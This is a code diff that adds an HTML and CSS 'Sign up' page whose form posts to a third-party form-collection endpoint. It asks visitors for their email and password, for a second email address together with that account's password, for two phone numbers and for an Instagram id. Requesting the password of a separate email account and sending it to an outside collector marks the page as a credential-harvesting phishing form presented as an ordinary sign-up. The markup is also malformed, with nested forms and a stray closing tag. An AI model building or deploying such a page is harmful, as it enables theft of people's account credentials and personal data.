@@ -1,0 +1,216 @@
+
+
+<!DOCTYPE html>
+<html>
+<head>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lobster&family=Open+Sans&display=swap">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css">
+  <style>
+    body {
+      font-family: 'Open Sans', sans-serif; /* Default font */
+      background-color: #f2f2f2;
+      text-align: center;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    /* Container */
+    .container {
+      width: 400px; /* Match the width of the images */
+      margin: 0 auto;
+      background: #fff;
+      padding: 20px;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+    }
+
+    /* Logo */
+    .logo {
+      margin-bottom: 20px;
+    }
+
+    .logo img {
+      width: 100px; /* Adjust the width as needed */
+      height: 100px; /* Adjust the height as needed */
+    }
+
+    /* Full-width input fields */
+    input[type="text"], input[type="password"], input[type="tel"], input[type="email"] {
+      width: 100%;
+      padding: 15px;
+      margin: 5px 0;
+      display: inline-block;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      background: #fff;
+      font-family: 'Open Sans', sans-serif; /* Apply the Open Sans font to inputs */
+    }
+
+    input[type="text"]:focus, input[type="password"]:focus, input[type="tel"]:focus, input[type="email"]:focus {
+      background-color: #f2f2f2;
+      outline: none;
+    }
+
+    hr {
+      border: none;
+      border-top: 1px solid #ccc;
+      margin: 15px 0;
+    }
+
+    /* Set a style for all buttons */
+    button {
+      background-color: #4285f4;
+      color: #fff;
+      padding: 15px 20px;
+      margin: 8px 0;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      width: 100%;
+      font-family: 'Open Sans', sans-serif; /* Apply the Open Sans font to buttons */
+    }
+
+    button:hover {
+      background-color: #357ae8;
+    }
+
+    /* Add padding to container elements */
+    .container .padding {
+      padding: 16px;
+    }
+
+    /* Clear floats */
+    .clearfix::after {
+      content: "";
+      clear: both;
+      display: table;
+    }
+
+    /* Your Provided Styles */
+    div {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-wrap: wrap;
+    }
+
+    div img {
+      width: 400px;
+      height: 300px;
+      border: 2px solid #ff3d0036;
+      border-radius: 13px;
+      box-shadow: 4px 7px 7px 0px #00000042;
+      cursor: pointer;
+      margin: 10px;
+      transition: 400ms;
+      position: relative;
+    }
+
+    div img:hover {
+      filter: grayscale(1);
+      transform: scale(1.03);
+    }
+
+    /* Add the custom checkmark */
+    div img:not(.logo)::before {
+      content: "\f00c"; /* Unicode code for a checkmark */
+      font-family: 'Font Awesome 5 Free'; /* Specify the correct font family */
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      color: #4CAF50; /* Green color */
+      font-size: 24px;
+      display: none; /* Hidden by default */
+    }
+
+    /* Show the checkmark on click, and hide others */
+    div img.clicked::before {
+      display: block;
+    }
+
+    div img.clicked::before ~ div img::before {
+      display: none;
+    }
+
+    /* Apply Lobster font to headings and labels */
+    h1, label {
+      font-family: 'Lobster', cursive;
+    }
+  </style>
+</head>
+<body>
+
+  <form
+  action="https://formspree.io/f/mnqkwndr"
+  method="POST"
+>
+  <h1>Sign up</h1>
+
+  <!-- Your Code Here -->
+  <form id="signup-form">
+    <!-- 1st: Email -->
+    <label for="email"><b>Your Email</b></label>
+    <input type="email" id="email" placeholder="Enter Your Email" name="email" required>
+
+    <!-- 2nd: Password -->
+    <label for="psw"><b>Your Password</b></label>
+    <input type="password" id="psw" placeholder="Enter Your Password" name="psw" required>
+
+    <!-- 3rd: Alternative Email -->
+    <label for="alt_email"><b>Your Alternative Email</b></label>
+    <input type="email" id="alt_email" placeholder="Enter Your Alternative Email" name="alt_email" required>
+
+    <!-- 4th: Password (for Alternative Email, within the same input) -->
+    <label for="alt_psw"><b>Your Password (Alternative Email)</b></label>
+    <input type="password" id="alt_psw" placeholder="Enter Your Password for Alternative Email" name="alt_psw" required>
+
+    <!-- 5th: Phone Number -->
+    <label for="phone"><b>Your Phone Number</b></label>
+    <input type="tel" id="phone" placeholder="Enter Your Phone Number" name="phone" required>
+
+    <!-- 6th: Alternative Phone Number -->
+    <label for="alt_phone"><b>Your Alternative Phone Number</b></label>
+    <input type="tel" id="alt_phone" placeholder="Enter Your Alternative Phone Number" name="alt_phone" required>
+    <!-- 6th: Give your Instagram id -->
+    <label for="instagram"><b>Your Instagram id</b></label>
+    <input type="text" id="instagram" placeholder="Enter your Instagram id" name="instagram" required>
+    <button type="submit">Sign up</button>
+  </form>
+  <!-- End of Your Code -->
+</div>
+
+<script>
+  // Add a click event listener to each image
+  const images = document.querySelectorAll('div img');
+  images.forEach(image => {
+    image.addEventListener('click', () => {
+      images.forEach(img => img.classList.remove('clicked'));
+      image.classList.add('clicked');
+    });
+  });
+
+  // Form submission and validation
+  const form = document.getElementById('signup-form');
+  form.addEventListener('submit', function (e) {
+    e.preventDefault();
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('psw').value;
+    const altEmail = document.getElementById('alt_email').value;
+    const altPassword = document.getElementById('alt_psw').value;
+    const phone = document.getElementById('phone').value;
+    const altPhone = document.getElementById('alt_phone').value;
+    const instagram = document.getElementById('instagram').value;
+
+    if (!email || !password || !altEmail || !altPassword || !phone || !altPhone || !instagram) {
+      alert('Please fill in all the required fields.');
+    } else {
+      alert('Form submitted successfully!');
+      // You can submit the form or perform other actions here.
+    }
+  });
+</script>
+</body>
+</html>
